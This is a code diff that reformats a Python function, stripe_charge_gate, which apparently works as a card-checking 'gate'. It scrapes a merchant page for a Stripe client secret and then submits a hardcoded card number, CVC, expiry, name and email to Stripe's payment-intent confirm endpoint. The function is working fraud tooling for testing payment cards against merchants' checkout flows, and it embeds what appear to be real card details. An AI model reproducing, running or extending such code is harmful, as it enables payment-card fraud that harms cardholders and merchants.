@@ -488,14 +488,18 @@ def stripe_charge_gate():
         pi_key = re.search("stripe.confirmCardPayment\('(.*)'\,", resp).group(1)
     except:
         return "", ""
-    
+
     payment_intent = pi_key.split("_")[0]
     headers = {
-    'content-type': 'application/x-www-form-urlencoded',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
-}
+        "content-type": "application/x-www-form-urlencoded",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
+    }
 
-    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=rose&payment_method_data[billing_details][email]=roseloverx%40proton.me&payment_method_data[card][number]=5360886344323030&payment_method_data[card][cvc]=394&payment_method_data[card][exp_month]=02&payment_method_data[card][exp_year]=25&payment_method_data[guid]=3a86e6fb-a4ad-45e5-b84d-753c14aeca051abe6d&payment_method_data[muid]=cc79fe27-9b43-442c-a8a0-2d99ed7ac3a676a978&payment_method_data[sid]=891e1a39-908f-417d-8be3-46e557d48ad9c0b4ee&payment_method_data[payment_user_agent]=stripe.js%2Fe5a12ae7c%3B+stripe-js-v3%2Fe5a12ae7c&payment_method_data[time_on_page]=69370&expected_payment_method_type=card&use_stripe_sdk=true&key={pk_key}&client_secret={pi_key}'
+    data = f"payment_method_data[type]=card&payment_method_data[billing_details][name]=rose&payment_method_data[billing_details][email]=roseloverx%40proton.me&payment_method_data[card][number]=5360886344323030&payment_method_data[card][cvc]=394&payment_method_data[card][exp_month]=02&payment_method_data[card][exp_year]=25&payment_method_data[guid]=3a86e6fb-a4ad-45e5-b84d-753c14aeca051abe6d&payment_method_data[muid]=cc79fe27-9b43-442c-a8a0-2d99ed7ac3a676a978&payment_method_data[sid]=891e1a39-908f-417d-8be3-46e557d48ad9c0b4ee&payment_method_data[payment_user_agent]=stripe.js%2Fe5a12ae7c%3B+stripe-js-v3%2Fe5a12ae7c&payment_method_data[time_on_page]=69370&expected_payment_method_type=card&use_stripe_sdk=true&key={pk_key}&client_secret={pi_key}"
 
-    response = requests.post('https://api.stripe.com/v1/payment_intents/{}/confirm'.format(payment_intent), headers=headers, data=data)
+    response = requests.post(
+        "https://api.stripe.com/v1/payment_intents/{}/confirm".format(payment_intent),
+        headers=headers,
+        data=data,
+    )
     return response.json()
